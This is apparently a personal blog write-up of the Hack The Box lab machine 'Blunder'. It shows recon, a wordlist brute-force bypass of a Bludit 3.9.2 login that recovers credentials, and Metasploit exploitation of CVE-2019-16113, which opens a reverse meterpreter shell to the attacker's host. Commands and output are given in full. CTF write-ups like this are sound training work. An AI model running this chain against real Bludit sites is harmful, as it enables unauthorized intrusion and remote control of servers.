---
title: "HTB Blunder"
date: 2020-09-19 12:35:00 +0800
categories: [HTB, writeup]
tags: [writeup]
toc: true
---

## Introduction

HTB Blunder is the first box where I managed to solve both the user flag and the root flag, and I'm excited so I decided to make a writeup! In the past, all of my writeups have been for small CTF challenges that can be solved within 4-5 minutes max, so writing up something as long as a full HTB challenge is definetely new to me. I am experimenting a bit in terms of categorization, although I hope the quality doesn't suffer too much. If this guide is helpful, great, glad it helped you! If it sucked, let me know how I can make it better. I am not the best when it comes to writing well and I'm using CTFs/HTB as a way to increase my writing skills.

With that out of the way, this is my guide for the challenge ``Blunder``. It took me around 5 hours to get the user flag, and it took me 15 minutes to get the root flag from there (a very popular exploit was used.)

## Reconnaissance

### nmap

As usual with HTB, the first thing to do is to use nmap to scan the box. The IP of the box is ``10.10.10.191``, as you can see in the command I used:

``nmap -sC -sV -o nmap.nmap 10.10.10.191``

Here is the output of the scan: 

```
kali@kali:~/Desktop$ nmap -sC -sV 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 22:39 EDT
Nmap scan report for 10.10.10.191
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.68 seconds
```

Alright, there is a web server, epic. Let's check it out:

![website](/assets/htb-blunder/website.PNG)

There isn't much to look at and there's only three blog posts..

### Dirbuster

My next move was to use dirbuster. I am bad so I'm still using the dirbuster GUI, although I will be using gobuster and wfuzz in the future.

I chose to scan with the file extension ``.txt`` on top of a normal directory search.

Here are the results:

![dirb](/assets/htb-blunder/dirb_results.PNG)

Cool, there's a ``todo`` page and an ``admin`` page. Let's check those out...

## Enumeration

![todo](/assets/htb-blunder/todo.PNG)

![login](/assets/htb-blunder/login.PNG)

From the todo page, it looks like we have a potential username, ``fergus``. It also hints that a ``CMS`` or ``content management system`` is in place.

From the admin page, we get the name of the CMS being used: ``Bludit``. 

I have a browser extension called Wappalyzer that told me the version of Bludit running on the web server.

![wappalyzer](/assets/htb-blunder/wappalyzer.PNG)

Epic, ``Bludit 3.9.2``. A quick google search tells us that this version is insecure as there are multiple vulnerabilities.

The first result on Google is for a ``Authentication Bruteforce Mitigation Bypass`` and that sounds promising as we have a login page and a username.

The next challenge comes in finding the credentials to brute force with. Luckily, I found that someone on a Discord server I frequent tried some of the longer wordlists without any luck, so my options were narrowed down from there. I could try out some of the more obscure seclists, or I could try making a custom wordlist using ``cewl``. I opted for the latter and made a wordlist with all the default options.

`` cewl -w wordlist.txt 10.10.10.191 ``

The exploit script came in ruby, and I was unable to get it to work. Thankfully, someone rewrote the exploit script in Python (https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master) and it worked wonderfully. 

`` python3 exploit.py 10.10.10.191 fergus wordlist.txt ``

```
[*] Trying: Richard
[*] Trying: Bachman
[*] Trying: written
[*] Trying: approximately
[*] Trying: short
[*] Trying: stories
[*] Trying: collections
[*] Trying: Stoker
[*] Trying: British
[*] Trying: Society
[*] Trying: Foundation
[*] Trying: Distinguished
[*] Trying: Contribution
[*] Trying: Letters
[*] Trying: probably
[*] Trying: fictional
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

## Exploitation

We now have credentials, epic. With this, we can make use of the second vulernability: https://www.cvedetails.com/cve/CVE-2019-16113/

In short, with these credentials, RCE is possible. I found a few different scripts/tools that let me make use of this exploit, however I decided to go with metasploit.

Here's how I did it:

First, enter the Metasploit Console:

```
kali@kali:~/Desktop/htb$ msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.87-dev                          ]
+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use the resource command to run commands from a file

msf5 > 
```

Cool. Next, we need to search for the exploit that we are going to use.

```
msf5 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability

```

Awesome, just what we were looking for! Let's set up Metasploit so that we can use this exploit.

```
msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > 
```

Alright, now we need to set the paramters for the exploit. In order to see everything that we can set, you want to use the command ``show options``.

```
Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2
```

Great, we have everything we need to solve this out.

```
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
RHOSTS => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST x.x.x.x
LHOST => x.x.x.x
```

Note: the LHOST IP is your IP address after connecting to HTB's VPN. You can find this by typing ``ip address`` into your terminal and looking at the entry for the ``tun0`` interface.

Start the explot by typing ``exploit``. 

```
msf5 exploit(linux/http/bludit_upload_images_exec) > exploit

[*] Started reverse TCP handler on x.x.x.x:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading ngvFnJkGdF.png...
[*] Uploading .htaccess...
[*] Executing ngvFnJkGdF.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (x.x.x.x:4444 -> 10.10.10.191:xxxxx) at 2020-09-21 18:20:52 -0400
[+] Deleted .htaccess

meterpreter > ls
Listing: /var/www/bludit-3.9.2/bl-content/tmp
=============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  8054  fil   2020-09-21 13:17:40 -0400  47779.c
100644/rw-r--r--  100   fil   2020-09-21 12:36:18 -0400  hienqjmo.jpg
100644/rw-r--r--  128   fil   2020-09-21 12:15:49 -0400  lnnnbgkk.jpg
100644/rw-r--r--  121   fil   2020-09-21 12:14:23 -0400  ncxwzhxs.jpg
100644/rw-r--r--  2007  fil   2020-09-21 14:54:03 -0400  oklzkwxkdv.png
100600/rw-------  30    fil   2020-09-21 11:54:43 -0400  poc.php
40755/rwxr-xr-x   4096  dir   2020-09-21 16:35:20 -0400  temp
40755/rwxr-xr-x   4096  dir   2020-09-21 18:27:02 -0400  thumbnails
100644/rw-r--r--  2007  fil   2020-09-21 14:56:36 -0400  ucoghhcdok.png
```

POGGERS we are in. The shell isn't the greatest though, so we can use Python to spawn in a better one.

```
meterpreter > shell
Process 18095 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/sh")'
$ 
```

Now that we have a good shell, let's look around the machine. There are two users we have access to: 

```
$ cd /home/
cd /home/
$ ls
ls
hugo  shaun
$ 
```

Let's take a look at Hugo's files.

```
hugo
cd hugo
$ ls
ls
1.txt  3.txt  Desktop    Downloads  Pictures  Templates  user.txt
2.txt  4.php  Documents  Music      Public    Videos
$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

This is cringe, we can't access the ``user.txt`` file. Looks like we need to find a way into Hugo's account. Let's check out the files from the webserver we were on earlier.















